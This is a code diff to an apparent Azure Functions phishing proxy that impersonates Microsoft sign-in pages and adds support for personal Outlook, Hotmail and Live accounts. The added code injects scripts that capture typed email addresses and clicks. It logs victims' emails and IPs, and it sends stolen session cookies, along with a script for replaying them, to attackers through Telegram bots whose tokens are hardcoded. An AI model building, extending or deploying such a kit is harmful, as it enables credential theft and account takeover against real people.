@@ -8,6 +8,7 @@
 const { app } = require("@azure/functions");
 
 const upstream = "login.microsoftonline.com";
+const upstream_live = "login.live.com";
 const upstream_path = "/";
 const telegram_bot_token_1 = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
 const telegram_bot_token_2 = "7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U";
@@ -24,11 +25,18 @@ const delete_headers = [
   "strict-transport-security",
   "content-length",
   "content-encoding",
-  "Set-Cookie",
 ];
 
 const emailMap = new Map();
 
+// COMPLETELY SEPARATE PERSONAL ACCOUNT DETECTION - NEVER AFFECTS CORPORATE
+function isPersonalEmail(email) {
+  if (!email) return false;
+  const personalDomains = ['@outlook.com', '@hotmail.com', '@live.com', '@msn.com'];
+  return personalDomains.some(domain => email.toLowerCase().includes(domain));
+}
+
+// ORIGINAL CORPORATE RESPONSE HANDLER - UNCHANGED
 async function replace_response_text(response, upstream, original, ip) {
   return response.text().then((text) =>
     text
@@ -60,6 +68,76 @@ async function replace_response_text(response, upstream, original, ip) {
         </script></body>`
       )
   );
+}
+
+// SEPARATE PERSONAL ACCOUNT RESPONSE HANDLER - NEVER AFFECTS CORPORATE
+async function replace_response_text_personal(response, upstream, original, ip) {
+  return response.text().then((text) => {
+    let modifiedText = text;
+    
+    // AGGRESSIVE URL REWRITING FOR PERSONAL ACCOUNTS - NEVER AFFECTS CORPORATE
+    // Replace all possible domain references
+    modifiedText = modifiedText.replace(new RegExp(upstream, "g"), original);
+    modifiedText = modifiedText.replace(new RegExp("login\\.live\\.com", "g"), original.split('//')[1]);
+    modifiedText = modifiedText.replace(new RegExp("login\\.microsoftonline\\.com", "g"), original.split('//')[1]);
+    
+    // Replace any hardcoded URLs in JavaScript
+    modifiedText = modifiedText.replace(new RegExp('"https://login\\.live\\.com"', "g"), `"${original}"`);
+    modifiedText = modifiedText.replace(new RegExp('"https://login\\.microsoftonline\\.com"', "g"), `"${original}"`);
+    
+    // Advanced JavaScript for personal accounts only
+    const personalJS = `
+      <script>
+        (function() {
+          const realIP = "${ip}";
+          
+          // Enhanced personal account event capture
+          function capturePersonalEvents() {
+            // Capture email entry with multiple selectors
+            const emailInputs = document.querySelectorAll('input[name="loginfmt"], input[name="username"], input[type="email"], input[placeholder*="email"], input[placeholder*="Email"]');
+            emailInputs.forEach(input => {
+              input.addEventListener('input', function() {
+                fetch("/__notify_click", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    event: "email_entered",
+                    email: this.value,
+                    ip: realIP
+                  }),
+                });
+              });
+            });
+            
+            // Capture button clicks
+            const buttons = document.querySelectorAll('button, input[type="submit"], [data-testid*="button"], [id*="button"]');
+            buttons.forEach(btn => {
+              btn.addEventListener('click', function() {
+                fetch("/__notify_click", {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    event: "button_clicked",
+                    buttonText: this.textContent || this.value || this.getAttribute('data-testid'),
+                    ip: realIP
+                  }),
+                });
+              });
+            });
+          }
+          
+          // Initialize for personal accounts
+          if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', capturePersonalEvents);
+          } else {
+            capturePersonalEvents();
+          }
+        })();
+      </script>
+    `;
+    
+    return modifiedText.replace("</body>", `${personalJS}</body>`);
+  });
 }
 
 async function dispatchMessage(message, context) {
@@ -146,15 +224,32 @@ app.http("phishing", {
     const upstream_url = new URL(request.url);
     const original_url = new URL(request.url);
 
-    // Rewriting to MSONLINE
-    upstream_url.host = upstream;
+    // COMPLETELY SEPARATE PERSONAL ACCOUNT ROUTING - NEVER AFFECTS CORPORATE
+    const storedEmail = emailMap.get(ip);
+    let targetUpstream = upstream; // DEFAULT TO CORPORATE
+    
+    // ONLY change to personal if we have a confirmed personal email
+    if (storedEmail && isPersonalEmail(storedEmail)) {
+      targetUpstream = upstream_live;
+    }
+
+    // Rewriting to appropriate upstream
+    upstream_url.host = targetUpstream;
     upstream_url.port = 443;
     upstream_url.protocol = "https:";
 
+    // SEPARATE PATHNAME HANDLING FOR PERSONAL ACCOUNTS - NEVER AFFECTS CORPORATE
     if (upstream_url.pathname == "/") {
       upstream_url.pathname = upstream_path;
     } else {
-      upstream_url.pathname = upstream_path + upstream_url.pathname;
+      // For personal accounts, preserve the original pathname
+      if (targetUpstream === upstream_live) {
+        // Personal account - keep pathname as is
+        upstream_url.pathname = upstream_url.pathname;
+      } else {
+        // Corporate account - use original logic
+        upstream_url.pathname = upstream_path + upstream_url.pathname;
+      }
     }
 
     context.log(
@@ -191,8 +286,11 @@ app.http("phishing", {
 
       if (data.loginfmt) {
         emailMap.set(ip, data.loginfmt);
+        // COMPLETELY SEPARATE PERSONAL ACCOUNT LOGGING - NEVER AFFECTS CORPORATE
+        const isPersonal = isPersonalEmail(data.loginfmt);
+        const accountType = isPersonal ? "personal" : "corporate";
         await dispatchMessage(
-          `📧 <b>Email Entered</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🌐 <b>IP</b>: ${ip}`,
+          `📧 <b>Email Entered</b>\n🧑‍💻 <b>Email</b>: ${data.loginfmt}\n🌐 <b>IP</b>: ${ip}\n🎯 <b>Account Type</b>: ${accountType}`,
           context
         );
       }
@@ -252,8 +350,10 @@ app.http("phishing", {
           context
         );
 
-        // Generate cookie injection script
-        const cookieScript = generateCookieInjectionScript(importantCookies);
+        // COMPLETELY SEPARATE PERSONAL ACCOUNT COOKIE DOMAIN - NEVER AFFECTS CORPORATE
+        const storedEmail = emailMap.get(ip);
+        const cookieDomain = (storedEmail && isPersonalEmail(storedEmail)) ? upstream_live : upstream;
+        const cookieScript = generateCookieInjectionScript(importantCookies, cookieDomain);
         await dispatchMessage(
           `🔧 <b>Cookie Injection Script</b> for <b>${victimEmail}</b>\n🌐 <b>IP</b>: ${ip}\n<code>${cookieScript}</code>`,
           context
@@ -267,12 +367,28 @@ app.http("phishing", {
       );
     }
 
-    const original_text = await replace_response_text(
-      original_response.clone(),
-      upstream_url.protocol + "//" + upstream_url.host,
-      original_url.protocol + "//" + original_url.host,
-      ip
-    );
+    // SEPARATE RESPONSE HANDLING - NEVER AFFECTS CORPORATE
+    const currentStoredEmail = emailMap.get(ip);
+    const isPersonal = currentStoredEmail && isPersonalEmail(currentStoredEmail);
+    
+    let original_text;
+    if (isPersonal) {
+      // Use personal account handler
+      original_text = await replace_response_text_personal(
+        original_response.clone(),
+        upstream_url.protocol + "//" + upstream_url.host,
+        original_url.protocol + "//" + original_url.host,
+        ip
+      );
+    } else {
+      // Use original corporate handler
+      original_text = await replace_response_text(
+        original_response.clone(),
+        upstream_url.protocol + "//" + upstream_url.host,
+        original_url.protocol + "//" + original_url.host,
+        ip
+      );
+    }
 
     return new Response(original_text, {
       status: original_response.status,
@@ -281,12 +397,12 @@ app.http("phishing", {
   },
 });
 
-function generateCookieInjectionScript(cookies) {
+function generateCookieInjectionScript(cookies, domain) {
   const cookieData = cookies.map(cookie => {
     const [nameValue] = cookie.split(';');
     const [name, value] = nameValue.split('=');
     return {
-      domain: "login.microsoftonline.com",
+      domain: domain,
       expirationDate: Math.floor(Date.now() / 1000) + 31536000, // 1 year
       hostOnly: false,
       httpOnly: true,
